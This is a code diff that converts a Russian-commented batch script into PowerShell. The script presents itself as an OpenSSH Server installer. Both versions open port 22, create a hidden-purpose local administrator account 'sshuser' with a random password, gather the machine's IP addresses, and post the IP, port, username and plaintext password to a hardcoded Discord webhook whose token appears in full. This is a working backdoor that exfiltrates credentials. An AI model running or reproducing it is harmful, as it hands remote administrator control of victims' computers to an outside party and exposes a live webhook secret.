@@ -1,72 +1,84 @@
-@echo off
-setlocal enabledelayedexpansion
+try {
+    $StopWatch = [system.diagnostics.stopwatch]::startNew()
 
-REM URL вебхука Discord
-set WebhookURL=https://discord.com/api/webhooks/1311849224886812702/dsmLjee1J1LmsF5oxFnj14QwPEcbKoZgsCnYcgEv-wdexA7rHko3ZR9Nquyd4cyRvaCs
+    # URL вебхука Discord
+    $WebhookURL = 'https://discord.com/api/webhooks/1311849224886812702/dsmLjee1J1LmsF5oxFnj14QwPEcbKoZgsCnYcgEv-wdexA7rHko3ZR9Nquyd4cyRvaCs'
 
-REM Функция отправки сообщения в Discord
-:send_discord_message
-set MessageContent=%1
-powershell -Command "Invoke-RestMethod -Uri %WebhookURL% -Method Post -Body '{\"content\":\"%MessageContent%\"}' -ContentType 'application/json'"
-goto :eof
+    # Функция отправки сообщения в Discord
+    function Send-DiscordMessage($MessageContent) {
+        $Message = @{
+            content = $MessageContent
+        }
 
-REM Стартовое сообщение
-call :send_discord_message "🚀 Начало установки OpenSSH Server..."
+        # Проверка, что сообщение не пустое
+        if (-not $Message.content) {
+            Write-Host "Ошибка: сообщение пустое!"
+            return
+        }
 
-REM Проверка на Linux или Windows и установка OpenSSH Server
-systeminfo | findstr /i "OS" | findstr /i "Microsoft" > nul
-if %errorlevel% equ 0 (
-    REM Это Windows
-    call :send_discord_message "🖥️ Обнаружена Windows-система. Устанавливаем OpenSSH Server..."
-    dism /online /add-capability /capabilityname:OpenSSH.Server~~~~0.0.1.0
-    powershell Start-Service sshd
-    powershell Set-Service -Name sshd -StartupType 'Automatic'
-    call :send_discord_message "✅ OpenSSH Server установлен и запущен на Windows."
+        try {
+            Invoke-RestMethod -Uri $WebhookURL -Method Post -Body (ConvertTo-Json $Message -Depth 10) -ContentType 'application/json'
+        } catch {
+            Write-Host "Не удалось отправить сообщение в Discord: $($Error[0])" -ForegroundColor Red
+        }
+    }
 
-    REM Настройка firewall
-    netsh advfirewall firewall show rule name=OpenSSH-Server-In-TCP > nul
-    if %errorlevel% neq 0 (
-        netsh advfirewall firewall add rule name="OpenSSH-Server-In-TCP" dir=in action=allow protocol=TCP localport=22
-        call :send_discord_message "🔒 Настроено правило firewall для SSH."
-    ) else (
-        call :send_discord_message "🛡️ Правило firewall для SSH уже существует."
-    )
+    # Отправляем стартовое сообщение
+    Send-DiscordMessage "🚀 Начало установки OpenSSH Server..."
 
-    REM Генерация случайного пароля
-    setlocal enabledelayedexpansion
-    set "chars=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
-    set "Password="
-    for /L %%i in (1,1,12) do (
-        set /a "index=!random! %% 62"
-        for /f %%c in ('echo !chars:~!index!,1!') do set Password=!Password!%%c
-    )
-    call :send_discord_message "🔑 Сгенерирован пароль: %Password%"
+    # Устанавливаем SSH Server
+    if ($IsLinux) {
+        Send-DiscordMessage "💻 Обнаружена Linux-система. Устанавливаем OpenSSH Server..."
+        & sudo apt install openssh-server -y
+        Send-DiscordMessage "✅ OpenSSH Server установлен на Linux."
+    } else {
+        Send-DiscordMessage "🖥️ Обнаружена Windows-система. Устанавливаем OpenSSH Server..."
+        Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
+        Start-Service sshd
+        Set-Service -Name sshd -StartupType 'Automatic'
+        Send-DiscordMessage "✅ OpenSSH Server установлен и запущен на Windows."
 
-    REM Добавление пользователя
-    set Username=sshuser
-    net user %Username% %Password% /add
-    net localgroup administrators %Username% /add
-    call :send_discord_message "👤 Создан пользователь: %Username%."
+        # Настраиваем firewall, если правила нет
+        if (-not (Get-NetFirewallRule -Name 'OpenSSH-Server-In-TCP' -ErrorAction SilentlyContinue)) {
+            New-NetFirewallRule -Name 'OpenSSH-Server-In-TCP' -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22
+            Send-DiscordMessage "🔒 Настроено правило firewall для SSH."
+        } else {
+            Send-DiscordMessage "🛡️ Правило firewall для SSH уже существует."
+        }
+    }
 
-    REM Получаем IP-адрес устройства
-    for /f "tokens=2 delims=:" %%a in ('ipconfig ^| findstr /i "IPv4"') do (
-        set IPAddress=%%a
-    )
-    call :send_discord_message "🌐 IP-адрес устройства: %IPAddress%"
+    # Генерируем случайный пароль
+    $Password = -join ((65..90) + (97..122) + (48..57) | Get-Random -Count 12 | ForEach-Object { [char]$_ })
+    Send-DiscordMessage "🔑 Сгенерирован пароль: `$Password"
 
-    REM Порт SSH
-    set Port=22
-    call :send_discord_message "⚙️ Порт SSH: %Port%"
+    # Добавляем пользователя для подключения (только Windows)
+    if (-not $IsLinux) {
+        $Username = "sshuser"
+        net user $Username $Password /add
+        net localgroup administrators $Username /add
+        Send-DiscordMessage "👤 Создан пользователь: $Username."
+    }
 
-    REM Итоговое сообщение
-    call :send_discord_message "✅ OpenSSH Server успешно установлен за %time% секунд!`nIP: %IPAddress%`nPort: %Port%`nUser: %Username%`nPassword: %Password%"
-) else (
-    REM Это Linux
-    call :send_discord_message "💻 Обнаружена Linux-система. Устанавливаем OpenSSH Server..."
-    sudo apt install openssh-server -y
-    call :send_discord_message "✅ OpenSSH Server установлен на Linux."
-)
+    # Получаем основной IP-адрес
+    $IPAddress = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { 
+        $_.InterfaceAlias -notmatch "Loopback" -and 
+        $_.IPAddress -notlike "169.254.*" -and 
+        $_.IPAddress -notlike "192.168.56.*" 
+    }).IPAddress -join ", "
+    Send-DiscordMessage "🌐 IP-адрес устройства: $IPAddress"
 
-REM Завершающее сообщение
-call :send_discord_message "🛑 Установка завершена. Нажмите любую клавишу для выхода."
-pause
+    # Настройки порта
+    $Port = 22
+    Send-DiscordMessage "⚙️ Порт SSH: $Port"
+
+    # Итоговое сообщение
+    [int]$Elapsed = $StopWatch.Elapsed.TotalSeconds
+    Send-DiscordMessage "✅ OpenSSH Server успешно установлен за $Elapsed секунд!`nIP: $IPAddress`nPort: $Port`nUser: $Username`nPassword: $Password"
+
+} catch {
+    $ErrorMessage = "⚠️ Ошибка в строке $($_.InvocationInfo.ScriptLineNumber): $($Error[0])"
+    Send-DiscordMessage $ErrorMessage
+} finally {
+    Send-DiscordMessage "🛑 Установка завершена. Нажмите любую клавишу для выхода."
+    Pause
+}
